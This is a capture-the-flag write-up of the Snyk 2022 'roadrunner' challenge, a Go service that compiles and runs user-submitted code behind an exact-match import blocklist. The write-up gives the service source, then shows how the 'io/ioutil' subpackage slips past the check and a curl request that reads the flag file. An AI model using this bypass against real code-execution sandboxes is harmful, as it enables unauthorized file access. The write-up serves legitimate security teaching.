# 2022 Snyk - roadrunner

We were given an app, its source and a Dockerfile. The app compiled and ran go source that was given in the input.

Source was as follows:
```go
package main

import (
	"fmt"
	"os"
	"os/exec"
	"io/ioutil"
	"strings"
	"go/parser"
	"go/token"
	"net/http"
	"encoding/json"
	"html/template"
	"path/filepath"
)

const (
	PORT = 8000
	BIN_NAME="sandbox"
	FILENAME = "main.go"
)

func main() {
	fmt.Println("Roadrunner running! 🏃")
	fmt.Printf("Access at: http://127.0.0.1:%d\n", PORT)
	http.HandleFunc("/", welcome)
	http.HandleFunc("/run", runner)
	// http.HandleFunc("/flag", getflag)
	http.ListenAndServe(fmt.Sprintf(":%d", PORT), nil)
}

type Sandbox struct {
	Script string `json:"script"`
	Result string
	dirname string
}

// func getflag(w http.ResponseWriter, r *http.Request) {
//     data, err := os.ReadFile("./flag.txt")
//     if err != nil {
// 		http.Error(w, err.Error(), http.StatusInternalServerError)
// 	} 
//     w.Write([]byte(string(data)))
// }

func (s* Sandbox) sanitizeScript() (bool, error) {
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, "main.go", *&s.Script, 0)
	if err != nil {
		return false, err
	}

	for _, s := range f.Imports {
		switch val := strings.Trim(s.Path.Value,"\""); val {
		case "io", "os", "bufio":
			return false, fmt.Errorf("File manipulating packages (like %s) are forbidden! 😤", val)
		case "syscall":
			return false, fmt.Errorf("No syscalls please 🙏")
		case "net":
			return false, fmt.Errorf("Networking doesn't fly either...🙅🏼‍♀️🦅")
		}
	}

	return true, err
}

func (s* Sandbox) writeScriptToFile() error {
	var err error
	if len(s.dirname) == 0 { 
		s.dirname, err = ioutil.TempDir("", "exec")
		if err != nil {
			return fmt.Errorf("Temp dir creation failed")
		}
	}

	source := filepath.Join(s.dirname, FILENAME)
	if err := ioutil.WriteFile(source, []byte(*&s.Script), 0666); err != nil {
		return fmt.Errorf("Writing script to tmp file failed.")
	}

	return nil
}

func (s* Sandbox) runScript() (string, error) {
	filepath := filepath.Join(s.dirname, FILENAME)
	fmt.Println("Script running from ", filepath)
	// go build
	cmd := &exec.Cmd {
		Path: "/usr/local/go/bin/go",
		Args: []string{ "go", "build", "-gcflags", "-N", "-o" ,BIN_NAME, FILENAME },
		Dir: s.dirname,
		Stdout: os.Stdout,
		Stderr: os.Stdout,
	}

	err := cmd.Start();
	if err != nil {
		return "", err
	}

	err = cmd.Wait()
	if err != nil {
		return "", err
	}
	
	// execute binary
	cmd = &exec.Cmd {
		Path: BIN_NAME,
		Args: []string{ BIN_NAME },
		Dir: s.dirname,
	}

	out, _ := cmd.CombinedOutput()
	return string(out), nil
}

func runner(w http.ResponseWriter, r *http.Request) {
	// res := Res{}
	sbx := Sandbox{} 
	err := json.NewDecoder(r.Body).Decode(&sbx)
    if err != nil {
        sbx.Result = err.Error()
        w.Write([]byte(sbx.Result))
		return   
	}
	
	sbx.writeScriptToFile()
	defer os.RemoveAll(sbx.dirname)

	if resSanitize, err := sbx.sanitizeScript(); !resSanitize {
		sbx.Result = err.Error()
	} else {
		resRun, err := sbx.runScript()
		if err != nil {
			sbx.Result = err.Error()
		} else {
			sbx.Result = resRun
		}
	}

	w.Write([]byte(sbx.Result))
}

func welcome(w http.ResponseWriter, r *http.Request) {
	t, _ := template.ParseFiles("./index.html")
    t.Execute(w, nil)
}
```

In the source several checks were made:
```go
for _, s := range f.Imports {
    switch val := strings.Trim(s.Path.Value,"\""); val {
    case "io", "os", "bufio":
    return false, fmt.Errorf("File manipulating packages (like %s) are forbidden! 😤", val)
    case "syscall":
        return false, fmt.Errorf("No syscalls please 🙏")
    case "net":
        return false, fmt.Errorf("Networking doesn't fly either...🙅🏼‍♀️🦅")
    }
}
```

On first glance, only specific imports are checked, but nested libraries are not included in those checks (e.g. "io/ioutil", "os/exec").
Because of this, exploiting this is as easy as:
```go
package main

import "fmt"
import "io/ioutil"

func main() {
	b, _ := ioutil.ReadFile("/flag.txt")
	fmt.Println(string(b))
}
```

```sh
$ curl 'http://roadrunner.c.ctf-snyk.io/run' -H 'Content-Type: application/json' --data-raw '{"Script":"package main\n\nimport \"fmt\"\nimport \"io/ioutil\"\n\nfunc main() {\n b, _ := ioutil.ReadFile(\"/flag.txt\")\n fmt.Println(string(b))\n}"}'
SNYK{0353182e5da6e0b79e01d71da48930f52a36321d1e8e124e10ac34f276f0a04b}
```
